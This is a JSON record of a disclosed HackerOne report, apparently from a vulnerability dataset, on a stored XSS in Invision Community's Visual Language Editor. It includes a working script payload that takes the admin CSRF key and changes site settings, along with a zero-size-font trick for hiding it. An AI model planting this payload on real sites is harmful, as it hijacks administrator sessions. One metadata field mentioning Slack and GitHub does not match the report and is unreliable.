{
  "reported_to": "Invision Power Services, Inc.",
  "reported_by": "mpiosik ",
  "title": "XSS with Visual Language Editor tags",
  "content": "\nCreate a post/comment/signature/etc. with the following text: #VLE#nothing#[<script>ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=system&controller=login&do=getCsrfKey').done(({key}) => ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=settings&controller=general', {'bypassRedirect':true, 'method': 'POST', 'data': {'csrfKey': key, 'site_online_checkbox':1, 'board_name': 'You have been hacked', 'form_submitted': 1}}))</script>]#!##.\nUsing e.g. the browser's Inspect Element feature, you can surround the text in editor with <span style='font-size: 0px;'> and </span> to make it invisible for humans.\nOnce the content is posted, visit the page with the content created in step 1. with Quick Translating enabled (ACP -> Customization -> Localization -> Languages -> Translations -> Quick Translating, otherwise known as Visual Language Editor or VLE) using an account with administrator privileges.\nNote: This is not very uncommon, as one could simply suggest an administrator to change wording of a language phrase, or correct a translation in an area where user-generated content (such as comments) is displayed.\nAfter visiting the webpage, website name will change to You have been hacked (the change can be seen in the browser tab title or in the website's header).\nThe origin of the vulnerability is line 254 in applications/core/dev/js/global/controllers/customization/ips.customization.visualLang.js. jQuery's replaceWith function, which accepts raw HTML, is fed with .text() output, which returns unescaped (non-HTML-encoded) text.\n(Code from step 1 formatted for readability):\nCode 1.20 KiB\n1ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=system&controller=login&do=getCsrfKey').done(({key}) => ips.getAjax()(\n2    ips.getSetting('baseURL') + 'admin/index.php?app=core&module=settings&controller=general', {\n3        'bypassRedirect':true,\n4        'method': 'POST',\n5        'data': {\n6            'csrfKey': key,\n7            'site_online_checkbox':1,\n8            'board_name': 'You have been hacked',\n9            'form_submitted': 1\n10        }\n11    }\n12))\n13\n14## Impact\n15\n16**The attacker could gain full control of the website and its data, including the ability to execute raw PHP code**. This example shows only a relatively harmless and very simple usage of the vulnerability, but **it can be used to perform any other action on the administrator's behalf**. For instance, attacker could prepare a script to modify a theme template to execute any given PHP code.\n17\n18Surrounding the VLE code with legitimate text and `<span class=\"font-size: 0px;\">...</span>`makes it invisible for humans, and it could be hidden from built-in search as well by placing it in a signature, for example. The post/signature can then be removed. Without knowing exactly what to look for, the attack origin might never be found.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {},
  "disclosed_date": 1694956980,
  "report_url": "https://hackerone.com/reports/2031855",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a post/comment/signature with the XSS payload using Visual Language Editor tags"
    ],
    [
      2,
      "Have an administrator with Quick Translating enabled visit the page containing the malicious content"
    ]
  ],
  "vuln_description": "This is a stored XSS vulnerability in the Visual Language Editor (VLE) feature that allows an attacker to execute arbitrary JavaScript in the context of an administrator's session. The vulnerability occurs due to improper handling of VLE tags in the JavaScript code, where unescaped text is passed to jQuery's replaceWith function, allowing HTML injection.",
  "reason": "The vulnerability requires understanding of multiple components: the VLE feature, its JavaScript implementation, and the admin interface's CSRF protection. The attacker must also know how to craft a payload that chains these components together (first obtaining a CSRF token, then making an admin request). The interaction between VLE tags and the unescaped jQuery replaceWith is subtle and not immediately obvious.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "since Slack and Github are independent applications, none of the steps would apply since they deal with user_session/user_ids scoped to the same application",
    "is_detectable": false
  }
}